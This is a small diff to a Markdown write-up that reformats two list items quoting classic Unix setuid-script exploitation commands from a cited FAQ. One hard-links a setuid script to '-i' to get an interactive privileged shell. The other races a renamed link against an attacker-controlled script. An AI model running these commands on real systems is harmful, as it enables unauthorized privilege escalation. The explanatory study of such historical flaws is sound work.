@@ -11,7 +11,8 @@ you win.
 [This incredible ressource](http://www.faqs.org/faqs/unix-faq/faq/part4/section-7.html)
 lists at least two exploitation vectors that use this idea:
 
-- ```
+- 
+  ```
   $ ln setuid-script -i
   $ PATH=.
   $ -i
@@ -20,7 +21,9 @@ lists at least two exploitation vectors that use this idea:
   A `#!/bin/sh` script would be called with `/bin/sh -i` giving you an
   interactive shell.
 
-- ```
+
+- 
+  ```
   $ ln setuid-script tmp
   $ nice -20 tmp &
   $ mv controlled-script tmp
